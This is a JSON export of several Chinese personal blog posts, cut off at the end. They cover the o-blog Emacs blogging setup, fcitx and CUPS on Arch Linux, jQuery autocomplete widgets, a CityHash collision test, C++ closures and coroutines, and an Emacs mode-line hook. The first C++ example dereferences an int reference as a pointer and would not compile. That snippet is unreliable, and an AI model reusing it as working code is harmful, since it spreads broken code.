[{
  "title": "\u4f7f\u7528o-blog\u642d\u5efa\u4e2a\u4eba\u535a\u5ba2",
  "timestamp": "2013-04-09 12:30:00",
  "tags": [
    "o@blog"
  ],
  "body": "<p>\n\u65b0\u7684\u535a\u5ba2\u4f7f\u7528<a href=\"http:\/\/renard.github.com\/o-blog\">o-blog<\/a>\u642d\u5efa\uff0c\u4f7f\u7528\u7684\u662f\u81ea\u5df2\u7684\u5206\u679d<a href=\"https:\/\/github.com\/tangxinfa\/o-blog\">tangxinfa-o-blog<\/a>\uff0c\u6211\u7684\u5206\u679d\u4e3b\u8981\u662f\u5bf9\u539f\u7cfb\u7edf\u505a\u4e86\u4e00\u5b9a\u7684\u7b80\u5316\u4ee5\u4fbf\u9002\u7528\u4e8e\u521b\u5efa\u4e2a\u4eba\u535a\u5ba2\uff0c\u53e6\u4fee\u590d\u4e86\u4e00\u4e9bbug\uff08\u4e3b\u8981\u662f\u4e2d\u6587\u76f8\u5173\uff09\uff0c\u53ef\u4f7f\u7528\u4ee5\u4e0b\u914d\u7f6e\u5b89\u88c5\u6211\u7684\u5206\u679d\uff1a\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-lisp\">(setq el-get-sources '((<span style=\"color: #cc99cc;\">:name<\/span> tangxinfa-o-blog\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span> <span style=\"color: #cc99cc;\">:type<\/span> git<span style=\"color: #f2777a; background-color: #515151;\"> <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span> <span style=\"color: #cc99cc;\">:url<\/span> <span style=\"color: #66cccc;\">\"https:\/\/github.com\/tangxinfa\/o-blog.git\"<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span> <span style=\"color: #cc99cc;\">:load<\/span> <span style=\"color: #66cccc;\">\"o-blog.el\"<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span> <span style=\"color: #cc99cc;\">:features<\/span> o-blog)))\n<\/pre>\n<\/div>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">M-x el-get-install tangxinfa-o-blog\n<\/pre>\n<\/div>\n\n<p>\n\u5177\u4f53\u4f7f\u7528\u53ef\u53c2\u8003\u672c\u535a\u5ba2\u7684\u539f\u59cborg\u6587\u4ef6\uff1a\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">git clone https:\/\/github.com\/tangxinfa\/tangxinfa.github.com.git\n<\/pre>\n<\/div>\n"
},
{
  "title": "Archlinux\u4e0b\u5b89\u88c5fcitx\u8f93\u5165\u6cd5",
  "timestamp": "2012-12-15 21:56:00",
  "tags": [
    "archlinux",
    "fcitx"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">\u5b89\u88c5<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo yaourt -S fcitx-im\nln -s \/etc\/xdg\/autostart\/fcitx-autostart.desktop  ~\/.config\/autostart\/\n<\/pre>\n<\/div>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">\u914d\u7f6e<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n\u5728\u914d\u7f6e\u6587\u4ef6~\/.xprofile\u4e2d\u6dfb\u52a0\u4ee5\u4e0b\u5185\u5bb9\uff1a\n<\/p>\n<pre class=\"example\">\nexport GTK_IM_MODULE=fcitx\nexport QT_IM_MODULE=fcitx\nexport XMODIFIERS=\"@im=fcitx\"\nexport LC_CTYPE=\"zh_CN.UTF-8\"\n<\/pre>\n\n<p>\n\u56e0\u4e3a\u7528\u7684\u662fgnome3\u684c\u9762\uff0c\u9700\u8981\u7981\u7528ibus\uff1a\n<\/p>\n<pre class=\"example\">\ngsettings set org.gnome.settings-daemon.plugins.keyboard active false\n<\/pre>\n<p>\n\u8fd8\u9700\u8981\u5728\u952e\u76d8\u5feb\u6377\u952e\u8bbe\u7f6e\u754c\u9762\u4e2d\u5c06\u8f93\u5165\u6e90\u5207\u6362\u7684\u5feb\u6377\u952e\u6e05\u9664\u3002\n<\/p>\n<\/div>\n<\/div>\n"
},
{
  "title": "Archlinux\u4e0b\u5b89\u88c5cups\u6253\u5370\u7cfb\u7edf",
  "timestamp": "2013-03-27 21:56:00",
  "tags": [
    "archlinux"
  ],
  "body": "<dl class=\"org-dl\">\n<dt> \u5b89\u88c5 <\/dt><dd><\/dd>\n<\/dl>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">yaourt -S cups-pdf\n<\/pre>\n<\/div>\n\n<dl class=\"org-dl\">\n<dt> \u542f\u52a8 <\/dt><dd><\/dd>\n<\/dl>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo systemctl start cups\n<\/pre>\n<\/div>\n\n<dl class=\"org-dl\">\n<dt> \u914d\u7f6e <\/dt><dd>    \u53c2\u8003\uff1a<a href=\"https:\/\/wiki.archlinux.org\/index.php\/Cups#PDF_virtual_printer\">https:\/\/wiki.archlinux.org\/index.php\/Cups#PDF_virtual_printer<\/a>\n\n<p>\n\u767b\u5f55\u7684\u7528\u6237\u540d\u8981\u4e3aroot\uff0c\u5426\u5219\u540e\u9762\u8fd8\u662f\u65e0\u6cd5\u6dfb\u52a0\u6253\u5370\u673a\uff0cweb\u754c\u9762\u6ca1\u6709\u9000\u51fa\u767b\u5f55\u7684\u9009\u9879\uff0c\u53ef\u4ee5\u8bd5\u8bd5\u91cd\u542fcups\u670d\u52a1\u6d4f\u89c8\u5668\u6e05\u9664\u7f13\u5b58\u7684\u6570\u636e\u3002<\/p>\n<\/dd>\n<\/dl>\n"
},
{
  "title": "\u7f51\u9875\u4e2d\u7684\u81ea\u52a8\u5b8c\u6210\u7684\u4e0b\u62c9\u5217\u8868\u6846",
  "timestamp": "2013-03-10 21:23:00",
  "tags": [
    "web",
    "jquery",
    "chosen"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">jqueryui\u7684<a href=\"http:\/\/jqueryui.com\/autocomplete\/#combobox\">\u7ec4\u4ef6<\/a><\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n\u793a\u4f8b\u6548\u679c\u770b\u8d77\u6765\u633b\u597d\uff0c\u4e0d\u8fc7\u53d1\u73b0\u51e0\u4e2a\u95ee\u9898\uff1a\n<\/p>\n\n<ul class=\"org-ul\">\n<li>\u548c<a href=\"http:\/\/twitter.github.com\/bootstrap\/\">bootstrap<\/a>\u6709\u51b2\u7a81\uff0c\u5bfc\u81f4\u53f3\u8fb9\u7684\u4e0b\u62c9\u7bad\u5934\u90e8\u5206\u90fd\u770b\u4e0d\u89c1\u3002\n<\/li>\n<li>\u64cd\u4f5c\u8fc7\u7a0b\u4e2d\u6709\u65f6\u5019\u663e\u793a\u7684\u503c\u548c\u5b9e\u9645\u7684\u503c\u4e0d\u4e00\u81f4\uff0c\u5e94\u8be5\u662f\u4e2d\u6587\u8f93\u5165\u6cd5\u6309\u952e\u4e8b\u4ef6\u5728firefox\u4e0b\u672a\u89e6\u53d1\u5f15\u8d77\u7684\u663e\u793a\u7684\u754c\u9762\u90e8\u5206\u548c\u9690\u85cf\u7684select\u8f93\u5165\u6846\u503c\u4e0d\u540c\u6b65\u3002\n<\/li>\n<li>\u6ca1\u6709\u63d0\u4f9b\u8bbe\u7f6e\u5f53\u524d\u9009\u4e2d\u9879\u3001\u7981\u7528\u7684\u529f\u80fd\uff0c\u8981\u81ea\u884c\u5bf9\u751f\u6210\u7684\u754c\u9762\u5143\u7d20\u8fdb\u884c\u5904\u7406\u3002\n<\/li>\n<\/ul>\n\n<p>\n\u8fd9\u4e2a\u53ea\u662fjqueryui\u81ea\u52a8\u5b8c\u6210\u8f93\u5165\u6846\u7684\u4e00\u4e2a\u5b9a\u5236\u793a\u4f8b\uff0c\u4e0d\u662f\u5f88\u5b8c\u5584\uff0c\u800cjqueryui\u81ea\u5e26\u7684\u6b63\u5f0f\u7248\u770b\u8d77\u6765\u53ea\u662f\u4e00\u4e2a\u8f93\u5165\u6846\u3002\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\"><a href=\"https:\/\/github.com\/harvesthq\/chosen\">chosen<\/a><\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n\u975e\u5e38\u5b8c\u7f8e\uff0c\u914d\u7f6e\u5f88\u7b80\u5355\uff0c\u800c\u4e14\u754c\u9762\u5f88\u6f02\u4eae\uff0c\u5728github\u4e0a\u8bc4\u5206\u5f88\u9ad8\u3002<\/p>\n<\/div>\n<\/div>\n"
},
{
  "title": "CityHash\u7b97\u6cd5\u51b2\u7a81\u7387\u6d4b\u8bd5",
  "timestamp": "2012-11-24 18:21:00",
  "tags": [
    "hash"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\"><a href=\"http:\/\/code.google.com\/p\/cityhash\/\">CityHash<\/a>\u4ecb\u7ecd<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n<a href=\"http:\/\/www.google.com\">Google<\/a> 2010\u5e74\u5f00\u59cb\u5f00\u53d1\u5e76\u5f00\u6e90\u7684\u5b57\u7b26\u4e32\u54c8\u5e0c\u7b97\u6cd5\uff0c\u4e3b\u8981\u5305\u542bCityHash32()\u3001CityHash64()\u548cCityHash128()\uff0c\u5206\u522b\u5bf9\u5e9432\u4f4d\u300164\u4f4d\u3001128\u4f4d\u54c8\u5e0c\u7b97\u6cd5\u3002\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">\u6d4b\u8bd5\u6837\u672c\u6570\u636e<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n16630591\u884c\u4e0d\u91cd\u590d\u5b57\u7b26\u4e32\uff0c\u6bcf\u4e00\u884c\u5185\u5bb9\u4e3a\u4ee5\u5236\u8868\u7b26\u5206\u9694\u7684\u4e0b\u8f7d\u5730\u5740\u548c\u5f15\u7528\u9875\u3002\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">cityhash64\u6d4b\u8bd5\u7ed3\u679c<\/h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n\u6ca1\u6709\u51b2\u7a81\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">cityhash32\u6d4b\u8bd5\u7ed3\u679c<\/h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<p>\n\u517132246\u6b21\u51b2\u7a81\uff0c\u51b2\u7a81\u7387\u7ea6\u4e3a\u5343\u5206\u4e4b\u4e8c\u3002\n\u540c\u4e00\u54c8\u5e0c\u503c\u4e0a55\u6b21\u51b2\u7a81\u4e8c\u6b21\uff0c32136\u6b21\u51b2\u7a81\u4e00\u6b21\u3002<\/p>\n<\/div>\n<\/div>\n"
},
{
  "title": "C++\u7684\u51fd\u6570\u3001\u95ed\u5305\u4e0e\u534f\u7a0b",
  "timestamp": "2013-03-15 10:04:00",
  "tags": [
    "cpp"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">\u5b9e\u73b0\u5e8f\u53f7\u751f\u6210\u5668<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<\/div><div id=\"outline-container-sec-1-1\" class=\"outline-3\">\n<h3 id=\"sec-1-1\">\u51fd\u6570\uff08Function\uff09<\/h3>\n<div class=\"outline-text-3\" id=\"text-1-1\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c++\"><span style=\"color: #cc99cc;\">#include<\/span> <span style=\"color: #66cccc;\">&lt;cassert&gt;<\/span>\n\n<span style=\"color: #6699cc;\">int<\/span> <span style=\"color: #f99157;\">id_generator<\/span>(<span style=\"color: #6699cc;\">int<\/span>&amp; <span style=\"color: #ffcc66;\">base<\/span>, <span style=\"color: #6699cc;\">int<\/span> <span style=\"color: #ffcc66;\">step<\/span>)\n{\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">int<\/span> <span style=\"color: #ffcc66;\">result<\/span> = *base;\n<span style=\"background-color: #515151;\"> <\/span>   *base += step;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> result;\n}\n\n<span style=\"color: #6699cc;\">int<\/span> <span style=\"color: #f99157;\">main<\/span>(<span style=\"color: #6699cc;\">int<\/span> <span style=\"color: #ffcc66;\">argc<\/span>, <span style=\"color: #6699cc;\">char<\/span> *<span style=\"color: #ffcc66;\">argv<\/span>[])\n{\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">int<\/span> <span style=\"color: #ffcc66;\">odd_base<\/span> = 1;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">int<\/span> <span style=\"color: #ffcc66;\">even_base<\/span> = 0;<span style=\"color: #f2777a; background-color: #515151;\">    <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   assert(id_generator(odd_base, 2) == 1);\n<span style=\"background-color: #515151;\"> <\/span>   assert(id_generator(odd_base, 2) == 3);\n<span style=\"background-color: #515151;\"> <\/span>   assert(id_generator(odd_base, 2) == 5);\n<span style=\"background-color: #515151;\"> <\/span>   assert(id_generator(even_base, 2) == 0);\n<span style=\"background-color: #515151;\"> <\/span>   assert(id_generator(even_base, 2) == 2);\n<span style=\"background-color: #515151;\"> <\/span>   assert(id_generator(even_base, 2) == 4);<span style=\"color: #f2777a; background-color: #515151;\">        <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> 0;\n}\n<\/pre>\n<\/div>\n\n<dl class=\"org-dl\">\n<dt> \u7f16\u8bd1 <\/dt><dd><pre class=\"example\">\ng++ -g add.cpp -o add\n<\/pre>\n<\/dd>\n<\/dl>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-1-2\" class=\"outline-3\">\n<h3 id=\"sec-1-2\">\u95ed\u5305\uff08Closure\uff09<\/h3>\n<div class=\"outline-text-3\" id=\"text-1-2\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c++\"><span style=\"color: #cc99cc;\">#include<\/span> <span style=\"color: #66cccc;\">&lt;cassert&gt;<\/span>\n\n<span style=\"color: #6699cc;\">int<\/span> <span style=\"color: #f99157;\">main<\/span>(<span style=\"color: #6699cc;\">int<\/span> <span style=\"color: #ffcc66;\">argc<\/span>, <span style=\"color: #6699cc;\">char<\/span> *<span style=\"color: #ffcc66;\">argv<\/span>[])\n{\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">int<\/span> <span style=\"color: #ffcc66;\">base<\/span> = 1;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">auto<\/span> <span style=\"color: #6699cc;\">id_generator_odd<\/span> = [=]() <span style=\"color: #99cc99;\">mutable<\/span> { <span style=\"color: #6699cc;\">int<\/span> <span style=\"color: #ffcc66;\">result<\/span> = base; base += 2; <span style=\"color: #99cc99;\">return<\/span><span style=\"text-decoration: underline;\"> result; };<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   base = 0;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">auto<\/span> <span style=\"color: #6699cc;\">id_generator_even<\/span> = [=]() <span style=\"color: #99cc99;\">mutable<\/span> { <span style=\"color: #6699cc;\">int<\/span> <span style=\"color: #ffcc66;\">result<\/span> = base; base += 2; <span style=\"color: #99cc99;\">retur<\/span><span style=\"color: #99cc99; text-decoration: underline;\">n<\/span><span style=\"text-decoration: underline;\"> result; };<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   assert(id_generator_odd() == 1);\n<span style=\"background-color: #515151;\"> <\/span>   assert(id_generator_odd() == 3);\n<span style=\"background-color: #515151;\"> <\/span>   assert(id_generator_odd() == 5);\n<span style=\"background-color: #515151;\"> <\/span>   assert(id_generator_even() == 0);\n<span style=\"background-color: #515151;\"> <\/span>   assert(id_generator_even() == 2);\n<span style=\"background-color: #515151;\"> <\/span>   assert(id_generator_even() == 4);\n<span style=\"background-color: #515151;\"> <\/span>   assert(base == 0);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> 0;\n}\n<\/pre>\n<\/div>\n\n<dl class=\"org-dl\">\n<dt> \u7f16\u8bd1 <\/dt><dd><pre class=\"example\">\ng++ -g closure.cpp -o closure -std=c++0x\n<\/pre>\n<\/dd>\n<\/dl>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-1-3\" class=\"outline-3\">\n<h3 id=\"sec-1-3\">\u534f\u7a0b\uff08Coroutine\uff09<\/h3>\n<div class=\"outline-text-3\" id=\"text-1-3\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c++\"><span style=\"color: #cc99cc;\">#include<\/span> <span style=\"color: #66cccc;\">&lt;boost\/bind.hpp&gt;<\/span>\n<span style=\"color: #cc99cc;\">#include<\/span> <span style=\"color: #66cccc;\">&lt;boost\/coroutine\/all.hpp&gt;<\/span>\n\n<span style=\"color: #99cc99;\">typedef<\/span> <span style=\"color: #6699cc;\">boost<\/span>::<span style=\"color: #6699cc;\">coroutines<\/span>::<span style=\"color: #6699cc;\">coroutine<\/span>&lt; <span style=\"color: #6699cc;\">int<\/span>(<span style=\"color: #6699cc;\">void<\/span>) &gt; <span style=\"color: #6699cc;\">IDGenerator<\/span>;\n\n<span style=\"color: #6699cc;\">void<\/span> <span style=\"color: #f99157;\">idGenerator<\/span>(<span style=\"color: #6699cc;\">IDGenerator<\/span>::<span style=\"color: #6699cc;\">caller_type<\/span>&amp; <span style=\"color: #ffcc66;\">ca<\/span>, <span style=\"color: #6699cc;\">int<\/span> <span style=\"color: #ffcc66;\">base<\/span>, <span style=\"color: #6699cc;\">int<\/span> <span style=\"color: #ffcc66;\">step<\/span>)\n{\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">do<\/span>{\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   ca(base);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   base += step;\n<span style=\"background-color: #515151;\"> <\/span>   }<span style=\"color: #99cc99;\">while<\/span>(<span style=\"color: #6699cc;\">true<\/span>);\n}\n\n<span style=\"color: #6699cc;\">int<\/span> <span style=\"color: #f99157;\">main<\/span>(<span style=\"color: #6699cc;\">int<\/span> <span style=\"color: #ffcc66;\">argc<\/span>, <span style=\"color: #6699cc;\">char<\/span> *<span style=\"color: #ffcc66;\">argv<\/span>[])\n{\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">IDGenerator<\/span> <span style=\"color: #ffcc66;\">id_generator_odd<\/span>(<span style=\"color: #6699cc;\">boost<\/span>::bind(idGenerator, _1, 1, 2));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">IDGenerator<\/span> <span style=\"color: #ffcc66;\">id_generator_even<\/span>(<span style=\"color: #6699cc;\">boost<\/span>::bind(idGenerator, _1, 0, 2));\n<span style=\"background-color: #515151;\"> <\/span>   assert(id_generator_odd.get() == 1);\n<span style=\"background-color: #515151;\"> <\/span>   assert(id_generator_odd().get() == 3);\n<span style=\"background-color: #515151;\"> <\/span>   assert(id_generator_odd().get() == 5);\n<span style=\"background-color: #515151;\"> <\/span>   assert(id_generator_even.get() == 0);\n<span style=\"background-color: #515151;\"> <\/span>   assert(id_generator_even().get() == 2);\n<span style=\"background-color: #515151;\"> <\/span>   assert(id_generator_even().get() == 4);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> 0;\n}\n<\/pre>\n<\/div>\n\n<dl class=\"org-dl\">\n<dt> \u7f16\u8bd1 <\/dt><dd><pre class=\"example\">\ng++ -g coroutine.cpp -lboost_context -o coroutine -std=c++0x\n<\/pre>\n<\/dd>\n<\/dl>\n<\/div>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">\u7279\u6027\u6bd4\u8f83<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<\/div><div id=\"outline-container-sec-2-1\" class=\"outline-3\">\n<h3 id=\"sec-2-1\">\u51fd\u6570\uff08Function\uff09<\/h3>\n<div class=\"outline-text-3\" id=\"text-2-1\">\n<ul class=\"org-ul\">\n<li>\u65e0\u72b6\u6001\n<\/li>\n<li>\u9700\u8981\u72ec\u7acb\u5b9a\u4e49\u6267\u884c\u4f53\n<\/li>\n<li>\u8c03\u7528\u8fc7\u7a0b\u4e2d\u4ece\u5934\u5230\u5c3e\u6267\u884c\u4f53\u5185\u6240\u6709\u4ee3\u7801\n<\/li>\n<li>\u5728\u8f93\u5165\u76f8\u540c\u7684\u60c5\u51b5\u4e0b\uff0c\u80fd\u591f\u4fdd\u8bc1\u8f93\u51fa\u4e5f\u76f8\u540c\n<\/li>\n<li>\u6ca1\u6709\u526f\u4f5c\u7528\uff0c\u591a\u7ebf\u7a0b\u5b89\u5168\n<\/li>\n<li>\u8981\u501f\u52a9\u5916\u90e8\u53d8\u91cf\u4fdd\u5b58\u72b6\u6001\n<\/li>\n<li>\u8c03\u7528\u6bd4\u8f83\u9ebb\u70e6\uff0c\u9700\u8981\u4f20\u5165\u4fdd\u5b58\u72b6\u6001\u7684\u53c2\u6570\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2-2\" class=\"outline-3\">\n<h3 id=\"sec-2-2\">\u95ed\u5305\uff08Closure\uff09<\/h3>\n<div class=\"outline-text-3\" id=\"text-2-2\">\n<ul class=\"org-ul\">\n<li>\u6709\u72b6\u6001\uff0c\u5185\u90e8\u76f4\u63a5\u4fdd\u5b58\n<\/li>\n<li>\u76f4\u63a5\u5185\u8054\u5b9a\u4e49\u6267\u884c\u4f53\n<\/li>\n<li>\u8c03\u7528\u8fc7\u7a0b\u4e2d\u4ece\u5934\u5230\u5c3e\u6267\u884c\u4f53\u5185\u6240\u6709\u4ee3\u7801\n<\/li>\n<li>\u8f93\u5165\u76f8\u540c\u7684\u60c5\u51b5\u4e0b\uff0c\u8f93\u51fa\u53ef\u80fd\u4e0d\u540c\n<\/li>\n<li>\u6709\u526f\u4f5c\u7528\uff0c\u975e\u591a\u7ebf\u7a0b\u5b89\u5168\n<\/li>\n<li>\u5b9a\u4e49\u65f6\u53ef\u4ee5\u591a\u79cd\u65b9\u5f0f\u5b89\u5168\u5730\u5f15\u7528\u5916\u90e8\u53d8\u91cf\n<\/li>\n<li>\u8c03\u7528\u7b80\u5355\uff0c\u4e0d\u9700\u8981\u4f20\u5165\u4fdd\u5b58\u72b6\u6001\u7684\u53c2\u6570\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2-3\" class=\"outline-3\">\n<h3 id=\"sec-2-3\">\u534f\u7a0b\uff08Coroutine\uff09<\/h3>\n<div class=\"outline-text-3\" id=\"text-2-3\">\n<ul class=\"org-ul\">\n<li>\u6709\u72b6\u6001\uff0c\u5185\u90e8\u76f4\u63a5\u4fdd\u5b58\n<\/li>\n<li>\u9700\u8981\u72ec\u7acb\u5b9a\u4e49\u6267\u884c\u4f53\n<\/li>\n<li>\u8c03\u7528\u8fc7\u7a0b\u4e2d\u76f4\u63a5\u4ece\u4e0a\u6b21\u7684\u8fd0\u884c\u72b6\u6001\u7ee7\u7eed\u8fd0\u884c\n<\/li>\n<li>\u8f93\u5165\u76f8\u540c\u7684\u60c5\u51b5\u4e0b\uff0c\u8f93\u51fa\u53ef\u80fd\u4e0d\u540c\n<\/li>\n<li>\u4e25\u7981\u591a\u7ebf\u7a0b\u8bbf\u95ee\n<\/li>\n<li>\u8c03\u7528\u7b80\u5355\uff0c\u4e0d\u9700\u8981\u4f20\u5165\u4fdd\u5b58\u72b6\u6001\u7684\u53c2\u6570    \n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n<\/div>\n"
},
{
  "title": "\u5728emacs\u6a21\u5f0f\u884c\u4e0a\u663e\u793a\u56fe\u7247\u7684\u5c3a\u5bf8",
  "timestamp": "2012-08-03 08:55:00",
  "tags": [
    "emacs"
  ],
  "body": "<p>\n\u4e0b\u9762\u7684lisp\u4ee3\u7801\u7528\u4e8e\u5728emacs\u6a21\u5f0f\u884c\u4e0a\u663e\u793a\u56fe\u7247\u7684\u5c3a\u5bf8\uff1a\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-lisp\">(add-hook 'image-mode-hook (<span style=\"color: #99cc99;\">lambda<\/span> ()\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span> <span style=\"color: #cc99cc;\">\"display image size on mode line.\"<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span> (setq mode-name (format <span style=\"color: #66cccc;\">\"Image[%s](%s*%s)\"<\/span><span style=\"color: #f2777a; background-color: #515151;\"> <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span> image-type<span style=\"color: #f2777a; background-color: #515151;\"> <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span> (car (image-size (image-get-di<span style=\"text-decoration: underline;\">splay-property) t))<\/span><span style=\"color: #f2777a; background-color: #515151; text-decoration: underline;\"> <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span> (cdr (image-size (image-get-di<span style=\"text-decoration: underline;\">splay-property) t))))))<\/span>\n<\/pre>\n<\/div>\n\n<dl class=\"org-dl\">\n<dt> \u6548\u679c\u5982\u4e0b <\/dt><dd><\/dd>\n<\/dl>\n<pre class=\"example\">\n[(Image[png](181*415))]\n<\/pre>\n"
},
{
